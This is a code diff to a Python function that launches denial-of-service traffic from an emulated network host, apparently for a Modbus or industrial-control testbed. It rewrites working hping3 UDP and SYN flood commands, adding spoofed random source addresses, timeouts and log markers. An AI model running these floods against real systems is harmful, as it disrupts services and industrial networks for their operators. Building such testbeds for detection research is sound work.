@@ -122,53 +122,34 @@ def run_dos_attack(net, mode="light", host_log_dir=None):
     host_log_q = host_log.replace("\\", "/")
     h5.cmd(f"mkdir -p {os.path.dirname(host_log_q)}")
 
-    h5.cmd("killall hping3")
+    h5.cmd("killall hping3 >/dev/null 2>&1 || true")
 
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    h5.cmd(f"echo '[DOS][INFO] target={target_ip}:{target_port} at={timestamp}' >> {host_log_q}")
 
     if mode == "light":
-        print("Running LIGHT DoS (Controlled mixed traffic)")
+        print("Running LIGHT DoS (controlled burst UDP+SYN)")
         h5.cmd(f"echo '\\n===== DoS LIGHT {timestamp} =====' >> {host_log_q}")
-
-        # UDP ringan
+        h5.cmd(f"echo '[DOS][LIGHT][UDP] start pps~2000 duration=45s' >> {host_log_q}")
         h5.cmd(
-            f"hping3 --udp -p {target_port} -i u100 {target_ip} "
-            f">> {host_log_q} 2>&1 &"
+            f"bash -lc 'timeout 45s hping3 --udp -q -p {target_port} -d 120 -i u500 {target_ip} >> {host_log_q} 2>&1 &'"
         )
-
-        # TCP SYN ringan (ganggu koneksi)
+        h5.cmd(f"echo '[DOS][LIGHT][SYN] start pps~1000 duration=45s' >> {host_log_q}")
         h5.cmd(
-            f"hping3 -S -p {target_port} -i u200 {target_ip} "
-            f">> {host_log_q} 2>&1 &"
-        )
-
-        # ICMP ringan (naikin RTT)
-        h5.cmd(
-            f"hping3 --icmp -i u200 {target_ip} "
-            f">> {host_log_q} 2>&1 &"
+            f"bash -lc 'timeout 45s hping3 -S -q -p {target_port} -d 64 --rand-source {target_ip} >> {host_log_q} 2>&1 &'"
         )
 
 
     elif mode == "heavy":
-        print("Running HEAVY DoS (Full mixed flood)")
+        print("Running HEAVY DoS (focused flood UDP+SYN)")
         h5.cmd(f"echo '\\n===== DoS HEAVY {timestamp} =====' >> {host_log_q}")
-
-        # UDP flood (bandwidth killer)
+        h5.cmd(f"echo '[DOS][HEAVY][UDP] start flood duration=60s' >> {host_log_q}")
         h5.cmd(
-            f"hping3 --udp --flood -p {target_port} {target_ip} "
-            f">> {host_log_q} 2>&1 &"
+            f"bash -lc 'timeout 60s hping3 --udp --flood -q -p {target_port} -d 120 --rand-source {target_ip} >> {host_log_q} 2>&1 &'"
         )
-
-        # TCP SYN flood (paling penting buat Modbus)
+        h5.cmd(f"echo '[DOS][HEAVY][SYN] start flood duration=60s' >> {host_log_q}")
         h5.cmd(
-            f"hping3 -S --flood -p {target_port} {target_ip} "
-            f">> {host_log_q} 2>&1 &"
-        )
-
-        # ICMP flood (tambahan delay)
-        h5.cmd(
-            f"hping3 --icmp --flood {target_ip} "
-            f">> {host_log_q} 2>&1 &"
+            f"bash -lc 'timeout 60s hping3 -S --flood -q -p {target_port} -d 64 --rand-source {target_ip} >> {host_log_q} 2>&1 &'"
         )
 
 
